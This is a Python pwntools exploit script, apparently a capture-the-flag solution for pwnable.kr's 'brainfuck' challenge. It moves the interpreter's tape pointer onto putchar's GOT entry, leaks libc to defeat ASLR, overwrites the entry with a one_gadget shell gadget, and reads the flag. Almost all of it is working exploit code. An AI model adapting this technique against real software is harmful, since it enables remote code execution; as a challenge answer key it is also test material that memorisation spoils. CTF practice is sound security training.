from pwn import *
import argh


ADDR = 'pwnable.kr'
PORT = 9001


"""
this is the solution for brainfuck challenge.
Steps:
    1. decrement the pointer to the 'tape' array, so that it points to itself.
    2. change the LSB, so that it points to the got.plt of the target function. (i targeted putchar)(we were lucky, and able to change one byte which enabled us to reach the got.plt).
    3. leak the address of the target function (putchar) in libc.
    4. change the address, so that when executed, it jumps some code.
    5. cause the code to be executed.

In the beginning, i targeted puts, but it didnt meet the requirements of any shell gadget (i used one_gadget to find gadgets that give shell in one jump).
So i changed to putchar, then got the pointer to point to some \x00, (by incrementing a lot) and called putchar. this jumped to the gadget that required [esp] be null.
"""


class Ops(object):
    dec = '-'
    inc = '+'
    dec_pointer = '<'
    inc_pointer = '>'
    putchar =  '.'
    getchar = ','
    exec_puts = '['


def start_gdb(p, target):
    gdb.attach(p, '''
    # break *0x80486b4
    # break *0x8048756 if $eax != '<'
    break *0x8048774
    break *0x804865e
    display/wx 0x804a080
    display/wx {}
    continue
    '''.format(target))


def _build_go_to_target_gotplt(e):
    offset = e.symbols[u'tape'] - e.symbols[u'p']
    return  offset * Ops.dec_pointer + Ops.getchar


def _get_libc_offsets():
    return (Ops.putchar + Ops.inc_pointer) * 4


def _insert_gadget_into_got_plt():
    return (Ops.dec_pointer + Ops.getchar) * 4

def _inc_pointer_alot():
    return Ops.inc_pointer * 200


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bf_path = './bf'
    gadget_offset = None
    target_func = u'putchar'

    if local:
        libc_path = '/lib/i386-linux-gnu/libc.so.6'
        p = process(bf_path)
        gadget_offset = 0x67a80  # used one_gadget to find this
    elif runpwn:
        libc_path = './bf_libc.so'
        p = remote(ADDR, PORT)
        gadget_offset = 0x5fbc6

    e = ELF(bf_path)
    libc = ELF(libc_path)

    if local:
        start_gdb(p, e.got[target_func])

    print(p.readlines(2))
    line_to_send = Ops.putchar + _build_go_to_target_gotplt(e) + _get_libc_offsets()  + _insert_gadget_into_got_plt() + _inc_pointer_alot() + Ops.putchar
    p.sendline(line_to_send)
    p.send(p32(e.got[target_func])[0])
    p.recvn(1)  # this is the first nullbyte
    leaked_libc_target_loc = p.recvn(4)
    libc_base = u32(leaked_libc_target_loc) - libc.symbols[target_func]
    print('leaked libcbase: 0x{:08x}'.format(libc_base))
    p.send(p32(gadget_offset + libc_base, endianness='big'))

    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

